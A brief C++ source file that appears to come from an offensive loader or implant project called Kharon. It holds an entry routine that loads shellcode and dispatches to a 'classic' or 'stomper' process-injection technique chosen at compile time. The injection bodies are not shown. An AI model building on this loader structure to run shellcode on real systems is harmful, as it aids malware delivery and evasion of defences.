#include <Kharon.h>
 
auto Injection::Main() -> VOID {
#if INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_CLASSIC
    return Injection::Classic();
#elif INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_STOMPER
    return Injection::Stomper();
#endif
}
 
auto EntryLoader( VOID ) -> VOID {
    if ( !Shellcode::Load() ) {
        DbgPrint( "Failed to load shellcode\n" );
        return;
    }
    Injection::Main();
}
 